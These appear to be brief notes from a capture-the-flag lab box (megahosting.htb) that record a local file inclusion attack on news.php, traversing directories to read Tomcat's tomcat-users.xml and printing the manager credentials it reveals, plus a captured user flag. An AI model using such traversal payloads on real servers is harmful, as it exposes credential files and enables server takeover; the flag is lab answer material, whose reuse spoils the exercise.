# ENUMERATION
- Possible domain megahosting.htb
- OS running Ubuntu
- LFI detected

## LFI Expedition
GET /news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>


# LOOT
- user : 79490d97554c342aab4610a8f5f9b568